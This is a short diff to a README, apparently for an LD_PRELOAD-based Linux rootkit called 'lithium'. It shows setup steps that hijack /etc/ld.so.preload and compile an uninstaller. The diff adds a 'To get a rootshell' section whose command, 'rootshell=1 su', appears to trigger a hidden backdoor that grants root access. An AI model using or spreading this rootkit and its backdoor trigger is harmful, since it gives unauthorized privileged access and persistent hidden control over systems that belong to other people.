@@ -26,7 +26,10 @@ Finally, create blank dummy file (redirect cat /etc/ld.so.preload to /etc/ld.so.
 ```
 sudo touch /etc/ld.so.preload.dummy
 ```
-
+To get a rootshell
+```
+rootshell=1 su
+```
 Compile lithium-uninstall
 ```
 gcc -static -o lithium-uninstall lithium-uninstall.c
